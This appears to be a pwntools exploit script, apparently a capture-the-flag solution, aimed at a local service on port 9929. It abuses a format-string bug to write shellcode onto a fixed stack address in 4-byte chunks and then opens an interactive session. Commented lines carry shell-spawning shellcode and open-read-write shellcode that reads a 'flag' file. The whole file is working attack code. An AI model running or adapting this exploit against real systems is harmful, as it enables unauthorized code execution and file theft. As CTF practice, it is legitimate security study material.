#!/usr/bin/env python3

from pwn import *
context.arch = 'x86_64'
context.log_level = 'debug'

class ProbIO:
    def __init__(self, r):
        self.r = r
        self.sla = lambda t, x: self.r.sendlineafter(t, x)
        self.sl = lambda x: self.r.sendline(x)

    def enter(self, content, read=False):
        self.sla("Enter: ", content)
        if read:
            self.r.recvuntil("Entered: ")
            print(self.r.recvline())

    def enterEx(self, content):
        self.sl(content)
        
class Primitives:
    def __init__(self, io):
        self.io = io

    def enterOnly(self, content): return self.io.enter(content, False)
    def enterRead(self, content): return self.io.enter(content, True)

def exploit(pri):
    pause()
    offset = 8
    stack = 0x50510000
    #sc = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
    #orw = "\x48\x31\xc0\x48\xc7\xc0\x67\x61\x6c\x66\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\x48\xc7\xc2\x30\x00\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05"
    #orw = "\x48\x31\xc0\x48\xc7\xc0\x67\x61\x6c\x66\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x02\x00\x00\x00\x48\x0d\x00\x00\x00\x40\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\x48\xc7\xc2\x30\x00\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x48\x0d\x00\x00\x00\x40\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x48\x0d\x00\x00\x00\x40\x0f\x05"
    orw = "\x48\x31\xc0\x48\xc7\xc0\x67\x61\x6c\x66\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x37\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\x48\xc7\xc2\x30\x00\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05"
    print(len(orw))

    # step 1

    for i in range(18):
        payload = fmtstr_payload(8, {stack+(0x10 + i * 4):orw[i * 4:i * 4 + 4]})
        pri.enterOnly(payload)

    pause()

    pri.enterOnly("done")
    pri.io.r.interactive()

def main(r):
    io = ProbIO(r)
    pri = Primitives(io)
    exploit(pri)

if __name__ == "__main__":
    r = remote("localhost", 9929)
    main(r)
